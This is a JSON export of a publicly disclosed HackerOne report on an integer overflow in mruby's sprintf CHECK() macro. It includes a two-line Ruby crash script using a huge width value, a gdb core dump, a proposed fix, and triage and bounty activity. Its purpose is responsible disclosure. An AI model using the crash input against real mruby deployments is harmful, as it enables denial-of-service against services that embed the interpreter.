{"id":204628,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDQ2Mjg=","url":"https://hackerone.com/reports/204628","title":"segafult in mruby's sprintf - mrb_str_format","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-02-08T15:18:56.665Z","submitted_at":"2017-02-08T15:18:56.665Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"aerodudrizzt","url":"/aerodudrizzt","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-02-28T20:24:47.917Z","bug_reporter_agreed_on_going_public_at":"2017-02-28T20:24:47.883Z","team_member_agreed_on_going_public_at":"2017-02-27T23:30:51.205Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The mruby sprintf gem (out of scope of mruby-engine) can be crashed when using a hostile \"width\" value in the format string.\n\nExploit Script\n===========\n```ruby\ns = \"hello\"\nsprintf(\"abcdefghijklmnopqrstuvwxyz % 2147483640s\", s)\n```\n\nHere is the core dump:\n```\nCore was generated by `ext/mruby_engine/mruby/build/host/bin/mirb'.\nProgram terminated with signal SIGSEGV, Segmentation fault.\n#0  0xb768bd7a in ?? ()\n(gdb) bt\n#0  0xb768bd7a in ?? ()\n#1  0x00000006 in ?? ()\n#2  0x0813d000 in ?? ()\nBacktrace stopped: previous frame inner to this frame (corrupt stack?)\n(gdb) info reg\neax            0x20202020\t538976288\necx            0x1fff62c7\t536830663\nedx            0x1\t1\nebx            0x800\t2048\nesp            0xbfe037c4\t0xbfe037c4\nebp            0x78\t0x78\nesi            0x81d7dc8\t136150472\nedi            0x8216000\t136404992\neip            0xb768bd7a\t0xb768bd7a\neflags         0x10202\t[ IF RF ]\ncs             0x73\t115\nss             0x7b\t123\nds             0x7b\t123\nes             0x7b\t123\nfs             0x0\t0\ngs             0x33\t51\n```\n\nTech Details\n==========\nThe sprintf.c file in the mrb_str_format() function is responsible for the building of the formatted string. When using a \"width\" value for anything (string, char, number, etc...) there is an integer-overflow in the CHECK() macro that is responsible for assuring the string's capacity will be enough for the operation:\n```cpp\n#define CHECK(l) do { \\\n  while (blen + (l) \u003e= bsiz) {\\\n    bsiz*=2;\\\n  }\\\n  mrb_str_resize(mrb, result, bsiz);\\\n  buf += RSTRING_PTR(result);\\\n} while(0)\n``` \n\nProposed Fix\n===========\nSince ```bsiz``` is always bigger-or-equal to ```blen``` the right check should be:\n```cpp\n#define CHECK(l) do { \\\n  while ((l) \u003e= bsiz - blen) {\\\n    bsiz*=2;\\\n  }\\\n  mrb_str_resize(mrb, result, bsiz);\\\n  buf += RSTRING_PTR(result);\\\n} while(0)\n``` \nThis way no arithmetic operation will done over the \"width\" parameter which can be up to MAX_INT in size, causing many possible integer-overflow.","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-03-29T23:30:51.241Z","allow_singular_disclosure_after":-143130700.86643925,"singular_disclosure_allowed":true,"vote_count":3,"voters":["heeeeen","eveeez","spetr0x"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1471421,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!","automated_response":true,"created_at":"2017-02-08T15:18:56.876Z","updated_at":"2017-02-08T15:18:56.876Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1471516,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We have reproduced the crash and opened an issue upstream: https://github.com/mruby/mruby/issues/3439","automated_response":false,"created_at":"2017-02-08T15:43:12.389Z","updated_at":"2017-02-08T15:43:12.389Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1500015,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for your report. This issue was addressed upstream in https://github.com/mruby/mruby/commit/ff03a9a61c62340cff62f8e0fdc1a1e8775b6f17.\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.","automated_response":false,"created_at":"2017-02-22T19:14:39.917Z","updated_at":"2017-02-22T19:14:39.917Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"aerodudrizzt","url":"/aerodudrizzt"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1509647,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of the MRuby project!","automated_response":false,"created_at":"2017-02-27T23:30:45.624Z","updated_at":"2017-02-27T23:30:45.624Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"aerodudrizzt","url":"/aerodudrizzt"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1509648,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-02-27T23:30:51.220Z","updated_at":"2017-02-27T23:30:51.220Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1510223,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the reward. The report can be publicly disclosed.","automated_response":false,"created_at":"2017-02-28T05:53:32.342Z","updated_at":"2017-02-28T05:53:32.342Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1511015,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"There should be an option to agree to disclosure at the bottom of the report.","automated_response":false,"created_at":"2017-02-28T13:56:02.497Z","updated_at":"2017-02-28T13:56:02.497Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1511899,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-02-28T20:24:47.899Z","updated_at":"2017-02-28T20:24:47.899Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1511900,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-02-28T20:24:47.932Z","updated_at":"2017-02-28T20:24:47.932Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}